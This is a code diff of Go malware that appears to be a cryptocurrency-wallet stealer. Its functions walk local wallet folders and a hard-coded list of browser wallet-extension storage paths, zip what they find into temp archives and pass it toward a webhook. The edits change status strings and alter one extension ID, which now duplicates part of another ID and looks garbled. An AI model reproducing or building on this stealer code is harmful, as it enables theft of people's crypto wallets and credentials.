@@ -46,7 +46,7 @@ func Local(webhook string) {
 				continue
 			}
 
-			found += fmt.Sprintf("\n✅ %s - %s", strings.Split(user, "\\")[2], name)
+			found += fmt.Sprintf("\n+ %s - %s", strings.Split(user, "\\")[2], name)
 		}
 	}
 
@@ -55,7 +55,7 @@ func Local(webhook string) {
 	}
 
 	if len(found) > 4090 {
-		found = "Too many wallets to list."
+		found = "-"
 	}
 
 	tempZip := fmt.Sprintf("%s\\wallets.zip", os.TempDir())
@@ -85,7 +85,7 @@ func Extensions(webhook string) {
 		"Core":            "\\Local Extension Settings\\agoakfejjabomempkjlepdflaleeobhb",
 		"Crocobit":        "\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke",
 		"Equal":           "\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac",
-		"Ever":            "\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk",
+		"Ever":            "\\Local Extension Settings\\cgeeodpfagjgjfhomihkjbmgjidlcdno",
 		"ExodusWeb3":      "\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno",
 		"Fewcha":          "\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj",
 		"Finnie":          "\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj",
@@ -202,7 +202,7 @@ func Extensions(webhook string) {
 			if err != nil {
 				continue
 			}
-			found += fmt.Sprintf("\n✅ %s - %s", profile.Browser.User, name)
+			found += fmt.Sprintf("\n+ %s - %s", profile.Browser.User, name)
 		}
 	}
 
@@ -211,7 +211,7 @@ func Extensions(webhook string) {
 	}
 
 	if len(found) > 4090 {
-		found = "Too many extensions to list."
+		found = "-"
 	}
 
 	tempZip := fmt.Sprintf("%s\\extensions.zip", os.TempDir())
